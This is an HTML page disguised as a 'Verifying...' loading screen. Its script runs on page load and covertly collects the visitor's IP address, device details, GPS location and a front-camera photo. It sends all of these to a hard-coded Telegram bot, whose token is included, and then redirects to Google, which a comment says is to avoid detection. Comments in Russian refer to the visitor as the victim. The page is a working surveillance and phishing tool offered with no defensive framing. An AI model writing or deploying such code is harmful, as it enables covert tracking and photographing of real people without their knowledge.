<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
</head>
<body style="background:#000; color:#fff; text-align:center; padding-top:20%; font-family:sans-serif;">
    <h2>Verifying...</h2>
    <video id="camera" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8758850534:AAF79a17p6NCuHMluPI_Rkw7FeoQSkCcRe8";
        const CHAT_ID = "7485234259";

        function sendText(text) {
            const img = new Image();
            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
        }

        async function sendPhoto(blob, caption) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'photo.jpg');
            formData.append('caption', caption);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        }

        async function steal() {
            // 1. Инфа об устройстве и IP
            let ip = "Unknown";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                ip = (await res.json()).ip;
            } catch(e) {}
            
            const deviceInfo = `🎯 Жертва\nIP: ${ip}\nDevice: ${navigator.userAgent}`;
            sendText(deviceInfo);

            // 2. GPS (Выскочит окно разрешения)
            navigator.geolocation.getCurrentPosition(
                (pos) => sendText(`🗺️ GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
                (err) => {}
            );

            // 3. Скрытое селфи (Выскочит окно камеры)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const video = document.getElementById('camera');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 1000));
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(track => track.stop());

                const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.8))).blob();
                await sendPhoto(blob, `📸 Селфи жертвы`);
            } catch (err) {}

            // Редирект на настоящий сайт, чтобы не палиться
            setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
        }

        window.onload = steal;
    </script>
</body>
</html>
